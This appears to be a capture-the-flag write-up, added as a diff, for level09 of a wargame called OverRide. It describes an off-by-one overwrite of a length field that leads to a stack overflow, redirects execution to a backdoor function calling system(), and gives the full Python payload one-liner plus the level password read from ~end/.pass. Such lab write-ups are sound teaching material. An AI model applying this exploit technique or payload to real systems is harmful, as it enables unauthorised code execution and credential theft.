@@ -1,0 +1,26 @@
+the program uses a struct to store a message, an username and a len variable used to copy of the message
+	char	msg[140];
+	char	username[40];
+	int		len;
+
+the set_username() function copies at most 41 Bytes into the `username` buffer,
+which can lead us to change the `len` variable by one Byte
+
+then the set_msg() function copies `len` Bytes into the `msg` buffer,
+but we control the `len` variable, so we can use this to overflow the whole struct
+and replace the return address
+
+there is a function secret_backdoor() [0x10088c] that calls system()
+we'll use it for the override of the return address
+
+here there is an offset [0x454000] in the addresses
+so insteed of the secret_backdoor() address of 0x10088c
+we'll use 0x55488c
+
+we send 40Bytes for the `username` buffer then 1 Byte for the `len` variable
+then 200Bytes to overflow the struct and then the offseted address of secret_backdoor()
+
+level09@OverRide:~$> (python -c 'print "A"*40 + "\xcb" + "\n" + "B"*200 + "\x8c\x48\x55" + "\n" + "/bin/sh" '; cat) | ./level09
+
+end@OverRide:~$> cat ~end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
